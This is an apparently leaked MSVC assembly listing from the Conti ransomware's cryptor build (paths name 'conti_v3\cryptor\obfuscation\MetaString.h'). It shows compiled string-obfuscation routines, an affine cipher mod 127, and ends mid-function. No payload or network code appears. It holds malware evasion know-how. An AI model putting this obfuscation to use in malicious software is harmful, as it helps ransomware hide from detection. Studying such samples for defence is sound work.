;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 38	 sub	 eax, 56			; 00000038H
  00006	44 6b c0 19	 imul	 r8d, eax, 25

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3d	 imul	 r8d, eax, 61		; 0000003dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 38	 add	 r8d, 56			; 00000038H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 75	 sub	 eax, 117		; 00000075H
  00006	44 6b c0 25	 imul	 r8d, eax, 37		; 00000025H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 67	 imul	 r8d, eax, 103		; 00000067H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 75	 add	 r8d, 117		; 00000075H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEBA_NXZ PROC ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 7a 00 00 00	 mov	 ecx, 122		; 0000007aH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 7a	 add	 r8d, 122		; 0000007aH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 1d 00 00 00	 mov	 ecx, 29
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00013	41 c1 e0 03	 shl	 r8d, 3

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 49	 imul	 r8d, eax, 73		; 00000049H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1d	 add	 r8d, 29
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 30 00 00 00	 mov	 ecx, 48			; 00000030H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 27	 imul	 r8d, ecx, 39		; 00000027H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
